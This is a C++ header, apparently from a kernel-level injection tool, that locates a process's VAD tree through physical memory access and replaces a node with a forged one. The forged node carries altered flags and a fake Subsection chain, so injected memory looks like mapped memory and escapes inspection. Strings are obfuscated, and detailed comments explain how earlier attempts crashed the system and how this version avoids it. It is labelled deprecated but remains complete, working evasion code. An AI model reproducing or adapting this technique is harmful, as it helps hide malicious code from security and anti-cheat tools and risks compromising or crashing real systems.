#pragma once

// ══════════════════════════════════════════════════════════════════
// DEPRECATED — this module is dead code as of the NtCreateSection
// injection rewrite.  NtMapViewOfSection produces a naturally
// MEM_MAPPED VAD (type 0, PrivateMemory=0) so VAD replacement is
// no longer needed.  vad::replace() and vad::replace_pid() are
// never called.  DO NOT re-enable without adding proper VadRoot
// push-lock acquisition (currently runs without kernel
// synchronization during the AVL tree swap).
// ══════════════════════════════════════════════════════════════════

namespace vad {

	std::uint64_t s_vadroot_off     = 0;
	std::uint64_t s_vadhint_off     = 0;
	std::uint64_t s_start_vpn_off   = 0;
	std::uint64_t s_end_vpn_off     = 0;
	std::uint64_t s_flags_off       = 0;
	std::uint64_t s_viewlinks_off   = 0;
	std::uint64_t s_vadsprocess_off = 0;

	std::uint64_t s_alloc_vad      = 0;
	std::uint64_t s_subsection_off = 0;

	constexpr std::uint32_t bit_no_change                 = 3u;
	constexpr std::uint32_t bit_vad_type                  = 4u;
	constexpr std::uint32_t bit_protection                = 7u;
	constexpr std::uint32_t bit_private_memory_always_set = 20u;
	constexpr std::uint32_t bit_private_memory            = 21u;

	bool setup( ) {
		s_vadroot_off = g_pdb->get_struct_member( obf( "_EPROCESS" ), obf( "VadRoot" ) );
		if ( !s_vadroot_off )
			return false;

		s_alloc_vad = g_pdb->get_symbol_address( obf( "MiAllocateVad" ) );
		if ( !s_alloc_vad )
			return false;

		const auto start  = g_pdb->get_struct_member( obf( "_MMVAD_SHORT" ), obf( "StartingVpn" ) );
		const auto end    = g_pdb->get_struct_member( obf( "_MMVAD_SHORT" ), obf( "EndingVpn"   ) );
		const auto u      = g_pdb->get_struct_member( obf( "_MMVAD_SHORT" ), obf( "u"            ) );
		const auto u1     = g_pdb->get_struct_member( obf( "_MMVAD_SHORT" ), obf( "u1"           ) );
		const auto vl     = g_pdb->get_struct_member( obf( "_MMVAD" ),       obf( "ViewLinks"    ) );
		const auto vp     = g_pdb->get_struct_member( obf( "_MMVAD" ),       obf( "VadsProcess"  ) );
		const auto hint   = g_pdb->get_struct_member( obf( "_EPROCESS" ),    obf( "VadHint"      ) );
		const auto sub    = g_pdb->get_struct_member( obf( "_MMVAD" ),       obf( "Subsection"   ) );

		s_start_vpn_off   = start ? start : 0x18;
		s_end_vpn_off     = end   ? end   : 0x1C;
		// On 19041+: "u"=0x34 (VadFlags: VadType/Protection/PrivateMemory), "u1"=0x38 (VadFlags1: CommitCharge).
		// On older builds: only "u1" exists for VadFlags.  Always use the lower-offset union.
		s_flags_off       = u ? u : ( u1 ? u1 : 0x34 );
		s_viewlinks_off   = vl    ? vl    : 0x60;
		s_vadsprocess_off = vp    ? vp    : 0x70;
		s_vadhint_off     = hint  ? hint  : ( s_vadroot_off + 0x08 );
		s_subsection_off  = sub   ? sub   : 0x48;

		return true;
	}

	std::uint64_t find( std::uint64_t node, std::uint32_t target_vpn ) {
		for ( int depth = 0; node && depth < 64; ++depth ) {
			const auto pa = g_paging->translate_linear( node );
			if ( !pa )
				return 0;

			std::uint32_t start = 0, end = 0;
			if ( !memory::read_physical( pa + s_start_vpn_off, &start, sizeof( start ) ) ||
				 !memory::read_physical( pa + s_end_vpn_off,   &end,   sizeof( end   ) ) )
				return 0;

			if ( target_vpn < start ) {
				std::uint64_t left = 0;
				memory::read_physical( pa, &left, sizeof( left ) );
				node = left;
			} else if ( target_vpn > end ) {
				std::uint64_t right = 0;
				memory::read_physical( pa + 0x08, &right, sizeof( right ) );
				node = right;
			} else {
				return node;
			}
		}
		return 0;
	}

	bool replace( std::uint64_t eprocess, std::uint64_t base_va ) {
		if ( !s_alloc_vad && !setup( ) ) {
			logging::print( obf( "[vad] offset resolution failed" ) );
			return false;
		}

		const auto vadroot_va = eprocess + s_vadroot_off;
		const auto vadroot_pa = g_paging->translate_linear( vadroot_va );
		if ( !vadroot_pa ) {
			logging::print( obf( "[vad] translate vadroot failed" ) );
			return false;
		}

		std::uint64_t root = 0;
		if ( !memory::read_physical( vadroot_pa, &root, sizeof( root ) ) || !root ) {
			logging::print( obf( "[vad] read vadroot failed" ) );
			return false;
		}

		const auto target_vpn = static_cast< std::uint32_t >( base_va >> 12 );
		 auto old_node   = find( root, target_vpn );
		if ( !old_node ) {
			logging::print( obf( "[vad] node not found for va=0x%llx" ), base_va );
			return false;
		}

		const auto old_pa = g_paging->translate_linear( old_node );
		if ( !old_pa ) {
			logging::print( obf( "[vad] translate old node failed" ) );
			return false;
		}

		std::uint64_t avl_left = 0, avl_right = 0, avl_parent = 0;
		memory::read_physical( old_pa + 0x00, &avl_left,   sizeof( avl_left   ) );
		memory::read_physical( old_pa + 0x08, &avl_right,  sizeof( avl_right  ) );
		memory::read_physical( old_pa + 0x10, &avl_parent, sizeof( avl_parent ) );

		std::uint32_t start_vpn = 0, end_vpn = 0;
		memory::read_physical( old_pa + s_start_vpn_off, &start_vpn, sizeof( start_vpn ) );
		memory::read_physical( old_pa + s_end_vpn_off,   &end_vpn,   sizeof( end_vpn   ) );

		std::uint32_t old_flags = 0;
		memory::read_physical( old_pa + s_flags_off, &old_flags, sizeof( old_flags ) );
		const auto protection = ( old_flags >> bit_protection ) & 0x1Fu;

		const auto start_addr = static_cast< std::uint64_t >( start_vpn ) << 12;
		const auto end_addr   = ( static_cast< std::uint64_t >( end_vpn ) << 12 ) | 0xFFF;

		// MiAllocateVad(start, end, 1) allocates a full _MMVAD (pool tag 'Vad ', ~0x88 bytes)
		// and initialises ALL fields including CommitCharge=0 and internal pointers.
		//
		// The previous approach used arg=0 which gives a _MMVAD_SHORT ('VadS', ~0x40 bytes).
		// The extended _MMVAD fields at offset 0x40+ were not initialised by MiAllocateVad,
		// leaving stale pool slab data in CommitCharge — causing 0x21 QUOTA_UNDERFLOW at
		// winlogon process exit (MiRemoveVadCharges returned ~549B pages of fake quota).
		//
		// Using arg=1 gives the full node.  MiAllocateVad zeroes CommitCharge and all other
		// quota-tracking fields before returning, so MiRemoveVadCharges returns 0 — no-op.
		// The full node also contains the internal pointers (Subsection=null, etc.) that
		// MmQueryVirtualMemory expects when walking a VadDevicePhysicalMemory VAD, avoiding
		// the 0x3B SYSTEM_SERVICE_EXCEPTION that a raw zero-fill produced.
		 auto new_node = g_syscall->call_kernel< std::uint64_t >(
			s_alloc_vad, start_addr, end_addr, static_cast< std::uint8_t >( 1 ) );

		if ( !new_node || new_node < 0xFFFF000000000000ULL ) {
			logging::print( obf( "[vad] MiAllocateVad failed" ) );
			return false;
		}

		const auto new_pa = g_paging->translate_linear( new_node );
		if ( !new_pa ) {
			logging::print( obf( "[vad] translate new node failed" ) );
			return false;
		}

		// patch VadType=VadLargePages (5), clear PrivateMemory, preserve Protection.
		// VadType=5: MiCloneVads gate  (v29[6] & 0x70) != 0x50  →  FALSE  →  MiBuildForkPte skipped.
		// NtQueryVirtualMemory returns MEM_MAPPED because PrivateMemory=0 and VadType≠2 (VadImageMap).
		{
			std::uint32_t flags = 0;
			memory::read_physical( new_pa + s_flags_off, &flags, sizeof( flags ) );

			flags &= ~( 0x1Fu << bit_protection );
			flags &= ~( 0x7u  << bit_vad_type );
			flags &= ~( 1u    << bit_private_memory );
			flags &= ~( 1u    << bit_no_change );
			flags &= ~( 1u    << bit_private_memory_always_set );
			flags |=  ( protection << bit_protection );
			flags |=  ( 5u << bit_vad_type );  // VadLargePages=5 → MiBuildForkPte loop never entered

			memory::write_physical( new_pa + s_flags_off, &flags, sizeof( flags ) );
		}

		// plant AVL tree pointers into new_node before it enters the live tree
		memory::write_physical( new_pa + 0x00, &avl_left,   sizeof( avl_left   ) );
		memory::write_physical( new_pa + 0x08, &avl_right,  sizeof( avl_right  ) );
		memory::write_physical( new_pa + 0x10, &avl_parent, sizeof( avl_parent ) );

		// self-referencing ViewLinks — RemoveEntryList during cleanup writes only to
		// the node itself (Flink->Blink = Flink, Blink->Flink = Blink, both = &ViewLinks)
		{
			auto viewlinks_va = new_node + s_viewlinks_off;
			memory::write_physical( new_pa + s_viewlinks_off,        &viewlinks_va, sizeof( viewlinks_va ) );
			memory::write_physical( new_pa + s_viewlinks_off + 0x08, &viewlinks_va, sizeof( viewlinks_va ) );
		}

		memory::write_physical( new_pa + s_vadsprocess_off, &eprocess, sizeof( eprocess ) );

		// ── critical window begins ──────────────────────────────────────────────────
		// Fix children's ParentValue to point at new_node BEFORE making new_node live.
		// A concurrent MiInsertVad that rebalances upward via ParentValue will then
		// arrive at new_node (which is not yet reachable from root), not at old_node.
		// That is benign: new_node.Parent == old_node's parent, so the rebalancer
		// continues upward correctly.  Children-before-parent eliminates the window
		// where a rebalancer reaches old_node after new_node is already live.

		if ( avl_left ) {
			const auto left_pa = g_paging->translate_linear( avl_left );
			if ( left_pa ) {
				std::uint64_t pv = 0;
				memory::read_physical( left_pa + 0x10, &pv, sizeof( pv ) );
				pv = new_node | ( pv & 3ULL );
				memory::write_physical( left_pa + 0x10, &pv, sizeof( pv ) );
			}
		}

		if ( avl_right ) {
			const auto right_pa = g_paging->translate_linear( avl_right );
			if ( right_pa ) {
				std::uint64_t pv = 0;
				memory::read_physical( right_pa + 0x10, &pv, sizeof( pv ) );
				pv = new_node | ( pv & 3ULL );
				memory::write_physical( right_pa + 0x10, &pv, sizeof( pv ) );
			}
		}

		// make new_node live — single pointer swap, children already consistent
		if ( old_node == root ) {
			memory::write_physical( vadroot_pa, &new_node, sizeof( new_node ) );
		} else {
			const auto parent_node = avl_parent & ~3ULL;
			if ( parent_node ) {
				const auto parent_pa = g_paging->translate_linear( parent_node );
				if ( parent_pa ) {
					std::uint64_t parent_left = 0;
					memory::read_physical( parent_pa, &parent_left, sizeof( parent_left ) );

					if ( parent_left == old_node )
						memory::write_physical( parent_pa,        &new_node, sizeof( new_node ) );
					else
						memory::write_physical( parent_pa + 0x08, &new_node, sizeof( new_node ) );
				}
			}
		}
		// ── critical window ends ────────────────────────────────────────────────────

		// zero old_node's VPN range first so a VadHint cache hit no longer matches it
		std::uint64_t k_zero = 0;
		memory::write_physical( old_pa + s_start_vpn_off, &k_zero, sizeof( std::uint32_t ) );
		memory::write_physical( old_pa + s_end_vpn_off,   &k_zero, sizeof( std::uint32_t ) );

		// orphan old_node: break its links so a stale traversal from it terminates
		memory::write_physical( old_pa + 0x00, &k_zero, sizeof( k_zero ) );
		memory::write_physical( old_pa + 0x08, &k_zero, sizeof( k_zero ) );
		memory::write_physical( old_pa + 0x10, &k_zero, sizeof( k_zero ) );

		// ── Fake Subsection chain — self-contained in old_node ───────────────────────
		// VadType=5 (VadLargePages) already skips MiBuildForkPte via the MiCloneVads gate.
		// MmQueryVirtualMemory still follows the chain for MEM_MAPPED / MEM_IMAGE distinction:
		//   VAD.Subsection → ControlArea → FilePointer = 0 → safe early-out at +0xc07
		//
		// old_node serves as BOTH the fake _SUBSECTION and the fake _CONTROL_AREA:
		//   old_node[+0x00] = old_node   (sub.ControlArea → self)
		//   old_node[+0x40] = 0          (ca.FilePointer = 0 → MmQueryVirtualMemory early-out)
		//
		// Crucially:
		//  • old_node IS the start of its pool block — ExFreePool(old_node) by cleanup is valid.
		//    The earlier approach pointed ControlArea at old_node+0x20 (mid-block), which gave
		//    BAD_POOL_CALLER 0xc2 when ExFreePool tried to free that mid-block address.
		//  • All writes reuse old_pa whose translation translate_linear proved correct above.
		//    The previous attempt used translate_linear on freshly-allocated MiAllocateVad blocks
		//    and received stale/wrong PAs, leaving FilePointer as 0x4b677844_02050000 ('DxgK'
		//    pool tag bytes) → SYSTEM_SERVICE_EXCEPTION in MiReferenceControlAreaFile.
		{
			memory::write_physical( old_pa + 0x00, &old_node, sizeof( old_node ) ); // sub.ControlArea → self
			memory::write_physical( old_pa + 0x40, &k_zero,   sizeof( k_zero   ) ); // ca.FilePointer  = 0

			// Wire new_node.Subsection → old_node (valid pool-block start) — must be last
			memory::write_physical( new_pa + s_subsection_off, &old_node, sizeof( old_node ) );

			logging::print( obf( "[vad] chain: sub=ca=%llx (self-ref, fp@+0x40=0)" ), old_node );
		}

		// zero VadHint so the next lookup goes through the tree and finds new_node
		const auto vadhint_va = eprocess + s_vadhint_off;
		const auto vadhint_pa = g_paging->translate_linear( vadhint_va );
		if ( vadhint_pa )
			memory::write_physical( vadhint_pa, &k_zero, sizeof( k_zero ) );

		logging::print( obf( "[vad] replaced va=0x%llx (0x%llx -> 0x%llx)" ),
			base_va, old_node, new_node );
		return true;
	}

	bool replace_pid( std::uint32_t pid, std::uint64_t base_va ) {
		const auto ep = process::find_eprocess( pid );
		if ( !ep ) {
			logging::print( obf( "[vad] eprocess not found for pid %u" ), pid );
			return false;
		}
		return replace( *ep, base_va );
	}
}
